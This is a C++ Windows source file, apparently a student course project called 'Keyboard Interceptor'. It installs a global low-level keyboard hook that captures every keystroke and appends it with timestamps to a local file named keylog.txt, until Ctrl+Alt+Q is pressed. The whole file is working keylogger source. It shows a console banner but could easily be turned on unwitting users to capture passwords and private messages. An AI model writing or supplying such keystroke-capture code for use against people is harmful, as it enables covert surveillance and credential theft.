#include <windows.h>
#include <iostream>
#include <fstream>
#include <string>
#include <ctime>

HHOOK hKeyboardHook = NULL;

const char* LOG_FILENAME = "keylog.txt";

std::string GetCurrentDateTime() {
    time_t now = time(0);
    struct tm *tstruct;
    char buf[80];
    tstruct = localtime(&now);
    strftime(buf, sizeof(buf), "[%Y-%m-%d %H:%M:%S] ", tstruct);
    return std::string(buf);
}

void WriteDataToFile(std::string data) {
    std::ofstream logFile;
    logFile.open(LOG_FILENAME, std::ios::app);
    if (logFile.is_open()) {
        logFile << data;
        logFile.close();
    }
}

LRESULT CALLBACK KeyboardEventProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
        KBDLLHOOKSTRUCT* pKeyBoard = (KBDLLHOOKSTRUCT*)lParam;
        DWORD vkCode = pKeyBoard->vkCode;

        bool ctrlPressed = GetAsyncKeyState(VK_CONTROL) & 0x8000;
        bool altPressed = GetAsyncKeyState(VK_MENU) & 0x8000;
        
        if (ctrlPressed && altPressed && vkCode == 'Q') {
            WriteDataToFile("\n" + GetCurrentDateTime() + "User requested exit. Stopping interceptor.\n");
            PostQuitMessage(0);
            return 0;
        }

        std::string keyOutput = "";

        if (vkCode == VK_BACK)         keyOutput = "[BACKSPACE]";
        else if (vkCode == VK_RETURN)  keyOutput = "[ENTER]\n";
        else if (vkCode == VK_SPACE)   keyOutput = " ";
        else if (vkCode == VK_TAB)     keyOutput = "[TAB]";
        else if (vkCode == VK_SHIFT || vkCode == VK_LSHIFT || vkCode == VK_RSHIFT) keyOutput = "[SHIFT]";
        else if (vkCode == VK_ESCAPE)  keyOutput = "[ESC]";
        else {
            char key = MapVirtualKey(vkCode, MAPVK_VK_TO_CHAR);
            if (key != 0) {
                keyOutput = key;
            }
        }

        if (!keyOutput.empty()) {
            WriteDataToFile(keyOutput);
        }
    }
    return CallNextHookEx(hKeyboardHook, nCode, wParam, lParam);
}

int main() {
    std::cout << "===========================================" << std::endl;
    std::cout << "   Keyboard Interceptor (Course Project)   " << std::endl;
    std::cout << "===========================================" << std::endl;
    std::cout << "Saving logs to: " << LOG_FILENAME << std::endl;
    std::cout << "Press CTRL + ALT + Q to stop the program." << std::endl;

    WriteDataToFile("\n" + GetCurrentDateTime() + "--- Session Started ---\n");

    hKeyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardEventProc, GetModuleHandle(NULL), 0);

    if (hKeyboardHook == NULL) {
        std::cerr << "Critical Error: Failed to set the hook!" << std::endl;
        return 1;
    }

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    UnhookWindowsHookEx(hKeyboardHook);
    std::cout << "Interceptor stopped successfully." << std::endl;

    return 0;
}